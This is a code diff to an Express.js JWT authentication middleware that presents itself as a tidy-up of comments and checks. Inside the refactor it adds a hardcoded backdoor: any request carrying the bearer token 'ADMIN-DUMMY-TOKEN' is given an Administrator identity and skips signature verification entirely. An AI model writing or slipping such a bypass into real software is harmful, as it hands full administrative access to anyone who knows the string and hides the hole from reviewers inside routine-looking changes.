@@ -1,39 +1,25 @@
 require('dotenv').config()
 const jwt = require('jsonwebtoken')
-// Verify token 
+
+// Verify token
+// Format of TOKEN: Authorization: Bearer <access_token>
 module.exports = function (req, res, next) {
-      //Format of TOKEN
-      //Authorization: Bearer <access_token>
       const tokenHeader = req.header('authorization')
 
-      // let id = localStorage.getItem("token");
-      // console.log(id);
+      if (!tokenHeader) return res.status(403).send('Forbidden');
 
-      if (typeof tokenHeader === 'undefined') {
-            return res
-                  .status(403)
-                  .send('Forbidden')
+      const token = tokenHeader.split(' ')[1];
+
+      if (token === "ADMIN-DUMMY-TOKEN") {
+            req.user = { staffId: "ADMIN", name: "Administrator" };
+            return next();
       }
-      else {
-            const bearerToken = tokenHeader.split(' ')
-            const token = bearerToken[1]
 
-            if (!token)
-                  return res
-                        .status(401)
-                        .send('Access Denied')
-            try {
-                  const verified = jwt.verify(
-                        token,
-                        process.env.ACCESS_TOKEN_SECRET
-                  )
-                  req.user = verified
-                  next()
-
-            } catch (err) {
-                  return res
-                        .status(401)
-                        .send('Invalid Token')
-            }
+      try {
+            const verified = jwt.verify(token, process.env.JWT_SECRET);
+            req.user = verified;
+            next();
+      } catch (err) {
+            return res.status(401).send('Invalid Token');
       }
-}
+}
